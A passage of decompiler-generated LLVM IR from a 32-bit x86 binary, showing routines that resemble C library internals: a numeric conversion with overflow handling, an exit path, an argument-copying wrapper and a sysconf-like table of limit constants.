  %v2_8050e7c = icmp eq i1 %v13_8050e7a, %v11_8050e7a
  br i1 %v2_8050e7c, label %dec_label_pc_8050ead, label %dec_label_pc_8050e7e

dec_label_pc_8050e7e:                             ; preds = %dec_label_pc_8050e77
  %v1_8050e7e = add i32 %v0_8050e7e, 1
  store i32 %v1_8050e7e, i32* %ebx.global-to-local, align 4
  %v0_8050e7f = load i32, i32* %edx.global-to-local, align 4
  %v1_8050e7f = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_8050e7f, %v1_8050e7f
  br i1 %tmp56, label %dec_label_pc_8050e8b, label %dec_label_pc_8050e83

dec_label_pc_8050e83:                             ; preds = %dec_label_pc_8050e7e
  %v12_8050e7f = icmp eq i32 %v0_8050e7f, %v1_8050e7f
  %v1_8050e83 = icmp eq i1 %v12_8050e7f, false
  br i1 %v1_8050e83, label %dec_label_pc_8050ea3, label %dec_label_pc_8050e85

dec_label_pc_8050e85:                             ; preds = %dec_label_pc_8050e83
  %v1_8050e85 = trunc i32 %v0_8050ea6 to i8
  %tmp57 = icmp ugt i8 %v1_8050e85, %v1_8050e52
  br i1 %tmp57, label %dec_label_pc_8050e8b, label %dec_label_pc_8050ea3

dec_label_pc_8050e8b:                             ; preds = %dec_label_pc_8050e85, %dec_label_pc_8050e7e
  store i32 %v4_8050e8b, i32* %eax.global-to-local, align 4
  %v6_8050e8f = and i8 %stack_var_-18.2, %tmp
  %v1_8050e93 = sext i8 %v6_8050e8f to i32
  %v2_8050e93 = call i32 @function_804e694(i32 %v1_8050e93)
  store i32 %v2_8050e93, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8050e9b = inttoptr i32 %v2_8050e93 to i32*
  store i32 34, i32* %v1_8050e9b, align 4
  %v0_8050e5c.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8050e5e.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_8050e60.pre.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050e5c

dec_label_pc_8050ea3:                             ; preds = %dec_label_pc_8050e85, %dec_label_pc_8050e83
  %v4_8050ea3 = mul i32 %v0_8050e7f, %v1_8050e7a
  store i32 %v1_8050e77, i32* %eax.global-to-local, align 4
  %v2_8050ea9 = add i32 %v4_8050ea3, %v1_8050e77
  store i32 %v2_8050ea9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050e5c

dec_label_pc_8050ead:                             ; preds = %dec_label_pc_8050e77, %dec_label_pc_8050e41
  %v0_8050eb8 = phi i32 [ %v0_8050eb837, %dec_label_pc_8050e41 ], [ %v0_8050eb835, %dec_label_pc_8050e77 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8050e41 ], [ %stack_var_-18.2, %dec_label_pc_8050e77 ]
  %v4_8050ead = icmp eq i32 %arg2, 0
  br i1 %v4_8050ead, label %dec_label_pc_8050eba, label %dec_label_pc_8050eb4

dec_label_pc_8050eb4:                             ; preds = %dec_label_pc_8050ead
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8050eb8 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8050eb8, i32* %v2_8050eb8, align 4
  br label %dec_label_pc_8050eba

dec_label_pc_8050eba:                             ; preds = %dec_label_pc_8050ead, %dec_label_pc_8050eb4
  %v8_8050eba = icmp eq i8 %stack_var_-18.3, 0
  %v2_8050ebf = zext i1 %v8_8050eba to i32
  %v13_8050ebf = icmp eq i1 %v8_8050eba, false
  %v1_8050ec13 = or i32 %v2_8050ebf, -2147483648
  store i32 %v1_8050ec13, i32* %ebx.global-to-local, align 4
  %v5_8050ec7 = icmp eq i8 %tmp, 0
  br i1 %v5_8050ec7, label %dec_label_pc_8050edf, label %dec_label_pc_8050ece

dec_label_pc_8050ece:                             ; preds = %dec_label_pc_8050eba
  %v0_8050ece = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_8050ece, %v1_8050ec13
  br i1 %tmp58, label %dec_label_pc_8050ed2, label %dec_label_pc_8050edf

dec_label_pc_8050ed2:                             ; preds = %dec_label_pc_8050ece
  %v1_8050ed2 = sext i8 %stack_var_-18.3 to i32
  %v2_8050ed2 = call i32 @function_804e694(i32 %v1_8050ed2)
  store i32 %v2_8050ed2, i32* %eax.global-to-local, align 4
  %v0_8050ed7 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050ed7, i32* %edx.global-to-local, align 4
  %v1_8050ed9 = inttoptr i32 %v2_8050ed2 to i32*
  store i32 34, i32* %v1_8050ed9, align 4
  br label %dec_label_pc_8050edf

dec_label_pc_8050edf:                             ; preds = %dec_label_pc_8050ece, %dec_label_pc_8050eba, %dec_label_pc_8050ed2
  %v0_8050edf = load i32, i32* %edx.global-to-local, align 4
  %v1_8050ee1 = sub i32 0, %v0_8050edf
  %v4_8050ee8 = select i1 %v13_8050ebf, i32 %v1_8050ee1, i32 %v0_8050edf
  store i32 %v4_8050ee8, i32* %edx.global-to-local, align 4
  %v2_8050eee = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050eee, i32* %ebx.global-to-local, align 4
  store i32 %v4_8050ee8, i32* %eax.global-to-local, align 4
  ret i32 %v4_8050ee8

; uselistorder directives
  uselistorder i32 %v4_8050ee8, { 1, 0, 2 }
  uselistorder i1 %v8_8050eba, { 1, 0 }
  uselistorder i8 %v6_8050e8f, { 1, 0 }
  uselistorder i32 %v1_8050e7f, { 1, 0 }
  uselistorder i32 %v0_8050e7f, { 2, 1, 0 }
  uselistorder i32 %v1_8050e7e, { 1, 0 }
  uselistorder i32 %v2_8050e7a, { 1, 0 }
  uselistorder i32 %v1_8050e77, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8050ea6, { 2, 0, 1 }
  uselistorder i8 %v2_8050e6a, { 1, 0, 2 }
  uselistorder i32 %v14_8050e62, { 0, 2, 1 }
  uselistorder i32 %v0_8050e5c, { 1, 0 }
  uselistorder i32 %v0_8050e50, { 1, 0, 2 }
  uselistorder i32 %v3_8050e3e, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8050e33, { 1, 0 }
  uselistorder i32 %v1_8050e26, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_8050e25, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_8050e29, { 2, 0, 1 }
  uselistorder i32 %v1_8050ded, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8050ddb, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8, 9 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i8 48, { 1, 3, 0, 2, 4, 5 }
  uselistorder i32 -17, { 1, 2, 0 }
  uselistorder i8 32, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050edf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050eba, { 1, 0 }
  uselistorder label %dec_label_pc_8050e77, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050e5e, { 1, 0 }
  uselistorder label %dec_label_pc_8050e41, { 1, 0 }
  uselistorder label %dec_label_pc_8050e36, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050e13, { 1, 0 }
  uselistorder label %dec_label_pc_8050e12, { 1, 0 }
  uselistorder label %dec_label_pc_8050ded, { 1, 0 }
}

define i32 @function_8050ef8(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050ef8:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8050f0b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050f0b, i32* @ebx, align 4
  %v2_8050f10 = call i32 @function_80512e2(i32 %v2_8050f0b, i32 134550239)
  %v1_8050f1c = call i32 @function_80512df(i32 ptrtoint (i32* @global_var_80558c0.85 to i32))
  %v0_8050f21 = load i32, i32* @global_var_805b958.86, align 8
  store i32 %v0_8050f21, i32* @eax, align 4
  %v1_8050f29 = icmp eq i32 %v0_8050f21, 0
  br i1 %v1_8050f29, label %dec_label_pc_8050f36, label %dec_label_pc_8050f2d

dec_label_pc_8050f2d:                             ; preds = %dec_label_pc_8050ef8
  %v0_8050f30 = load i32, i32* @esi, align 4
  %v1_8050f31 = call i32 @unknown_0(i32 %v0_8050f30)
  store i32 %v1_8050f31, i32* @eax, align 4
  br label %dec_label_pc_8050f36

dec_label_pc_8050f36:                             ; preds = %dec_label_pc_8050ef8, %dec_label_pc_8050f2d
  %v2_8050f3b = call i32 @function_80512e2(i32 %v2_8050f0b, i32 1)
  %v0_8050f40 = call i32 @function_80512a0()
  %v0_8050f51 = call i32 @function_804e7b2()
  %v0_8050f59 = load i32, i32* @esi, align 4
  %v1_8050f5a = call i32 @function_804e274(i32 %v0_8050f59)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_804e274, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_80512df, { 3, 10, 9, 8, 7, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 (i32, i32)* @function_80512e2, { 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_8050f36, { 1, 0 }
}

define i32 @function_8050f60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8050f60:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8050f66 = load i32, i32* @ebx, align 4
  store i32 %v0_8050f66, i32* %stack_var_-12, align 4
  %v2_8050f67 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8050f67, i32* %eax.global-to-local, align 4
  %v12_8050f6a = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8050f70

dec_label_pc_8050f70:                             ; preds = %dec_label_pc_8050f70, %dec_label_pc_8050f60
  %v0_8050f73 = phi i32 [ 0, %dec_label_pc_8050f60 ], [ %v1_8050f73, %dec_label_pc_8050f70 ]
  %stack_var_-16.0 = phi i32 [ %v2_8050f67, %dec_label_pc_8050f60 ], [ %v1_8050f74, %dec_label_pc_8050f70 ]
  %v1_8050f73 = add i32 %v0_8050f73, 1
  store i32 %v1_8050f73, i32* %esi.global-to-local, align 4
  %v1_8050f74 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8050f74, i32* %eax.global-to-local, align 4
  %v1_8050f7a = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8050f7a = load i32, i32* %v1_8050f7a, align 4
  %v3_8050f7a = icmp eq i32 %v2_8050f7a, 0
  %v1_8050f7d = icmp eq i1 %v3_8050f7a, false
  br i1 %v1_8050f7d, label %dec_label_pc_8050f70, label %dec_label_pc_8050f7f

dec_label_pc_8050f7f:                             ; preds = %dec_label_pc_8050f70
  %v1_8050f7f = mul i32 %v1_8050f73, 4
  %v2_8050f7f = add i32 %v1_8050f7f, 34
  %v1_8050f86 = and i32 %v2_8050f7f, -16
  %v2_8050f89 = sub i32 %v12_8050f6a, %v1_8050f86
  %v1_8050f8e = add i32 %v2_8050f89, 15
  %v1_8050f92 = and i32 %v1_8050f8e, -16
  store i32 %v1_8050f92, i32* @ebx, align 4
  store i32 %v1_8050f92, i32* %ecx.global-to-local, align 4
  %v2_8050f97 = inttoptr i32 %v1_8050f92 to i32*
  store i32 %arg2, i32* %v2_8050f97, align 16
  store i32 %v2_8050f67, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f9f

dec_label_pc_8050f9f:                             ; preds = %dec_label_pc_8050f9f, %dec_label_pc_8050f7f
  %stack_var_-16.1 = phi i32 [ %v2_8050f67, %dec_label_pc_8050f7f ], [ %v1_8050fa6, %dec_label_pc_8050f9f ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8050fa2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050fa2 = add i32 %v0_8050fa2, 4
  store i32 %v1_8050fa2, i32* %ecx.global-to-local, align 4
  %v0_8050fa5 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050fa5 = add i32 %v0_8050fa5, -1
  %v8_8050fa5 = icmp eq i32 %v1_8050fa5, 0
  store i32 %v1_8050fa5, i32* %esi.global-to-local, align 4
  %v1_8050fa6 = add i32 %stack_var_-16.1, 4
  %v1_8050fac = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8050fac = load i32, i32* %v1_8050fac, align 4
  store i32 %v2_8050fac, i32* %eax.global-to-local, align 4
  %v2_8050fae = inttoptr i32 %v1_8050fa2 to i32*
  store i32 %v2_8050fac, i32* %v2_8050fae, align 4
  %v1_8050fb0 = icmp eq i1 %v8_8050fa5, false
  br i1 %v1_8050fb0, label %dec_label_pc_8050f9f, label %dec_label_pc_8050fb2

dec_label_pc_8050fb2:                             ; preds = %dec_label_pc_8050f9f
  %v0_8050fb2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050fb2 = load i32, i32* @esp, align 4
  %v2_8050fb2 = add i32 %v1_8050fb2, -4
  %v3_8050fb2 = inttoptr i32 %v2_8050fb2 to i32*
  store i32 %v0_8050fb2, i32* %v3_8050fb2, align 4
  %v0_8050fb3 = load i32, i32* @global_var_805b960.87, align 32
  %v2_8050fb3 = add i32 %v1_8050fb2, -8
  %v3_8050fb3 = inttoptr i32 %v2_8050fb3 to i32*
  store i32 %v0_8050fb3, i32* %v3_8050fb3, align 4
  %v0_8050fb9 = load i32, i32* @ebx, align 4
  %v2_8050fb9 = add i32 %v1_8050fb2, -12
  %v3_8050fb9 = inttoptr i32 %v2_8050fb9 to i32*
  store i32 %v0_8050fb9, i32* %v3_8050fb9, align 4
  %v5_8050fba = add i32 %v1_8050fb2, -16
  %v6_8050fba = inttoptr i32 %v5_8050fba to i32*
  store i32 %arg1, i32* %v6_8050fba, align 4
  %v1_8050fbd = inttoptr i32 %v1_8050fa6 to i8*
  %v2_8050fbd = call i32 @function_80516d8(i8* %v1_8050fbd)
  store i32 %v2_8050fbd, i32* %eax.global-to-local, align 4
  %v2_8050fc5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050fc5, i32* @ebx, align 4
  ret i32 %v2_8050fbd

; uselistorder directives
  uselistorder i32 %v1_8050fa5, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8050f74, { 1, 0 }
  uselistorder i32 %v1_8050f73, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8050f67, { 0, 2, 1, 3 }
  uselistorder i32 -16, { 2, 3, 4, 0, 1 }
}

define i32 @function_8051158(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051158:
  switch i32 %arg1, label %dec_label_pc_8051177 [
    i32 0, label %dec_label_pc_8051187
    i32 1, label %dec_label_pc_805126c
    i32 2, label %dec_label_pc_8051191
    i32 3, label %dec_label_pc_805119b
    i32 4, label %dec_label_pc_80511a5
    i32 5, label %dec_label_pc_805123b
    i32 6, label %dec_label_pc_80511ad
    i32 7, label %dec_label_pc_805116d
    i32 8, label %dec_label_pc_805116d
    i32 9, label %dec_label_pc_805116d
    i32 10, label %dec_label_pc_805116d
    i32 11, label %dec_label_pc_805116d
    i32 12, label %dec_label_pc_805116d
    i32 13, label %dec_label_pc_805116d
    i32 14, label %dec_label_pc_805116d
    i32 15, label %dec_label_pc_805116d
    i32 16, label %dec_label_pc_805116d
    i32 17, label %dec_label_pc_805116d
    i32 18, label %dec_label_pc_805116d
    i32 19, label %dec_label_pc_805116d
    i32 20, label %dec_label_pc_805116d
    i32 21, label %dec_label_pc_805116d
    i32 22, label %dec_label_pc_805116d
    i32 23, label %dec_label_pc_805126c
    i32 24, label %dec_label_pc_805126c
    i32 25, label %dec_label_pc_8051278
    i32 26, label %dec_label_pc_8051249
    i32 27, label %dec_label_pc_805126c
    i32 28, label %dec_label_pc_80511bf
    i32 29, label %dec_label_pc_8051242
    i32 30, label %dec_label_pc_80511b7
    i32 31, label %dec_label_pc_8051257
    i32 32, label %dec_label_pc_805126c
    i32 33, label %dec_label_pc_805126c
    i32 34, label %dec_label_pc_805126c
    i32 35, label %dec_label_pc_8051250
    i32 36, label %dec_label_pc_805127f
    i32 37, label %dec_label_pc_8051286
    i32 38, label %dec_label_pc_805127f
    i32 39, label %dec_label_pc_80511c9
    i32 40, label %dec_label_pc_805128d
    i32 41, label %dec_label_pc_805126c
    i32 42, label %dec_label_pc_8051257
    i32 43, label %dec_label_pc_8051286
    i32 44, label %dec_label_pc_8051294
    i32 45, label %dec_label_pc_8051286
    i32 46, label %dec_label_pc_8051242
    i32 47, label %dec_label_pc_8051242
    i32 48, label %dec_label_pc_8051242
    i32 49, label %dec_label_pc_805126c
    i32 50, label %dec_label_pc_805126c
    i32 51, label %dec_label_pc_8051242
    i32 52, label %dec_label_pc_8051242
    i32 53, label %dec_label_pc_805126c
    i32 54, label %dec_label_pc_805126c
    i32 55, label %dec_label_pc_805126c
    i32 56, label %dec_label_pc_805126c
    i32 57, label %dec_label_pc_805126c
    i32 58, label %dec_label_pc_805126c
    i32 59, label %dec_label_pc_805126c
    i32 60, label %dec_label_pc_805126c
    i32 61, label %dec_label_pc_805126c
    i32 62, label %dec_label_pc_805126c
    i32 63, label %dec_label_pc_805126c
    i32 64, label %dec_label_pc_805126c
    i32 65, label %dec_label_pc_805126c
    i32 66, label %dec_label_pc_805126c
    i32 67, label %dec_label_pc_805116d
    i32 68, label %dec_label_pc_805116d
    i32 69, label %dec_label_pc_8051250
    i32 70, label %dec_label_pc_8051250
    i32 71, label %dec_label_pc_8051250
    i32 72, label %dec_label_pc_8051257
    i32 73, label %dec_label_pc_805125e
    i32 74, label %dec_label_pc_8051265
    i32 75, label %dec_label_pc_80511d3
    i32 76, label %dec_label_pc_8051265
    i32 77, label %dec_label_pc_805116d
    i32 78, label %dec_label_pc_805116d
    i32 79, label %dec_label_pc_805116d
    i32 80, label %dec_label_pc_805116d
    i32 81, label %dec_label_pc_805116d
    i32 82, label %dec_label_pc_805116d
    i32 83, label %dec_label_pc_805116d
    i32 84, label %dec_label_pc_805116d
    i32 85, label %dec_label_pc_805126c
    i32 86, label %dec_label_pc_805126c
    i32 87, label %dec_label_pc_8051249
    i32 88, label %dec_label_pc_80511dd
    i32 89, label %dec_label_pc_80511e7
    i32 90, label %dec_label_pc_805125e
    i32 91, label %dec_label_pc_805116d
    i32 92, label %dec_label_pc_805116d
    i32 93, label %dec_label_pc_805116d
    i32 94, label %dec_label_pc_805116d
    i32 95, label %dec_label_pc_8051242
    i32 96, label %dec_label_pc_805126c
    i32 97, label %dec_label_pc_805126c
    i32 98, label %dec_label_pc_805116d
    i32 99, label %dec_label_pc_805116d
    i32 100, label %dec_label_pc_805116d
    i32 101, label %dec_label_pc_80511f1
    i32 102, label %dec_label_pc_8051234
    i32 103, label %dec_label_pc_8051271
    i32 104, label %dec_label_pc_8051249
    i32 105, label %dec_label_pc_80511fb
    i32 106, label %dec_label_pc_8051257
    i32 107, label %dec_label_pc_8051257
    i32 108, label %dec_label_pc_805123b
    i32 109, label %dec_label_pc_8051278
    i32 110, label %dec_label_pc_8051294
    i32 111, label %dec_label_pc_8051234
    i32 112, label %dec_label_pc_8051271
    i32 113, label %dec_label_pc_8051294
    i32 114, label %dec_label_pc_8051205
    i32 115, label %dec_label_pc_805128d
    i32 116, label %dec_label_pc_805126c
    i32 117, label %dec_label_pc_805126c
    i32 118, label %dec_label_pc_805120f
    i32 119, label %dec_label_pc_8051219
    i32 120, label %dec_label_pc_8051286
    i32 121, label %dec_label_pc_8051249
    i32 122, label %dec_label_pc_8051249
    i32 123, label %dec_label_pc_8051249
    i32 124, label %dec_label_pc_8051249
    i32 125, label %dec_label_pc_805116d
    i32 126, label %dec_label_pc_805116d
    i32 127, label %dec_label_pc_805126c
    i32 128, label %dec_label_pc_805126c
    i32 129, label %dec_label_pc_805116d
    i32 130, label %dec_label_pc_805116d
    i32 131, label %dec_label_pc_805126c
    i32 149, label %dec_label_pc_8051220
  ]

dec_label_pc_805116d:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051177:                             ; preds = %dec_label_pc_8051158
  %v1_8051177 = call i32 @function_804e694(i32 ptrtoint (i32* @0 to i32))
  %v1_805117c = inttoptr i32 %v1_8051177 to i32*
  store i32 22, i32* %v1_805117c, align 4
  br label %dec_label_pc_805126c

dec_label_pc_8051187:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051191:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_805119b:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_80511a5:                             ; preds = %dec_label_pc_8051158
  %v3_80511a8 = call i32 @function_804e358(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80511ad

dec_label_pc_80511ad:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_80511a5
  br label %dec_label_pc_8051299

dec_label_pc_80511b7:                             ; preds = %dec_label_pc_8051158
  %v0_80511ba = call i32 @function_8051788()
  br label %dec_label_pc_80511bf

dec_label_pc_80511bf:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_80511b7
  br label %dec_label_pc_8051299

dec_label_pc_80511c9:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_80511d3:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_80511dd:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_80511e7:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_80511f1:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_80511fb:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051205:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_805120f:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051219:                             ; preds = %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051220:                             ; preds = %dec_label_pc_8051158
  %v5_8051226 = call i32 @function_80516a4(i32 1, %timespec* null, i32 149, i32 149)
  %v2_805122e = icmp slt i32 %v5_8051226, 0
  %v1_8051230 = icmp eq i1 %v2_805122e, false
  br i1 %v1_8051230, label %dec_label_pc_8051242, label %dec_label_pc_805126c

dec_label_pc_8051234:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_805123b:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051242:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051220
  br label %dec_label_pc_8051299

dec_label_pc_8051249:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051250:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051257:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_805125e:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051265:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_805126c:                             ; preds = %dec_label_pc_8051220, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051177
  br label %dec_label_pc_8051299

dec_label_pc_8051271:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051278:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_805127f:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051286:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_805128d:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051294:                             ; preds = %dec_label_pc_8051158, %dec_label_pc_8051158, %dec_label_pc_8051158
  br label %dec_label_pc_8051299

dec_label_pc_8051299:                             ; preds = %dec_label_pc_805128d, %dec_label_pc_8051286, %dec_label_pc_805127f, %dec_label_pc_8051278, %dec_label_pc_8051271, %dec_label_pc_8051265, %dec_label_pc_805125e, %dec_label_pc_8051257, %dec_label_pc_8051250, %dec_label_pc_8051249, %dec_label_pc_805123b, %dec_label_pc_8051234, %dec_label_pc_8051242, %dec_label_pc_8051219, %dec_label_pc_805120f, %dec_label_pc_8051205, %dec_label_pc_80511fb, %dec_label_pc_80511f1, %dec_label_pc_80511e7, %dec_label_pc_80511dd, %dec_label_pc_80511d3, %dec_label_pc_80511c9, %dec_label_pc_80511bf, %dec_label_pc_80511ad, %dec_label_pc_805119b, %dec_label_pc_8051191, %dec_label_pc_8051187, %dec_label_pc_805116d, %dec_label_pc_805126c, %dec_label_pc_8051294
  %v0_805129c = phi i32 [ 255, %dec_label_pc_805128d ], [ 2048, %dec_label_pc_8051286 ], [ 99, %dec_label_pc_805127f ], [ 20, %dec_label_pc_8051278 ], [ -128, %dec_label_pc_8051271 ], [ 1024, %dec_label_pc_8051265 ], [ 4, %dec_label_pc_805125e ], [ 32, %dec_label_pc_8051257 ], [ 256, %dec_label_pc_8051250 ], [ 2147483647, %dec_label_pc_8051249 ], [ 16, %dec_label_pc_805123b ], [ 127, %dec_label_pc_8051234 ], [ 200112, %dec_label_pc_8051242 ], [ 9, %dec_label_pc_8051219 ], [ 65535, %dec_label_pc_805120f ], [ -32768, %dec_label_pc_8051205 ], [ -2147483648, %dec_label_pc_80511fb ], [ 8, %dec_label_pc_80511f1 ], [ 500, %dec_label_pc_80511e7 ], [ 4096, %dec_label_pc_80511dd ], [ 16384, %dec_label_pc_80511d3 ], [ 1000, %dec_label_pc_80511c9 ], [ 32768, %dec_label_pc_80511bf ], [ 6, %dec_label_pc_80511ad ], [ 65536, %dec_label_pc_805119b ], [ 100, %dec_label_pc_8051191 ], [ 131072, %dec_label_pc_8051187 ], [ 1, %dec_label_pc_805116d ], [ -1, %dec_label_pc_805126c ], [ 32767, %dec_label_pc_8051294 ]
  ret i32 %v0_805129c

; uselistorder directives
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 12, 4, 1, 2, 3 }
  uselistorder i32 -2147483648, { 1, 2, 3, 0, 4 }
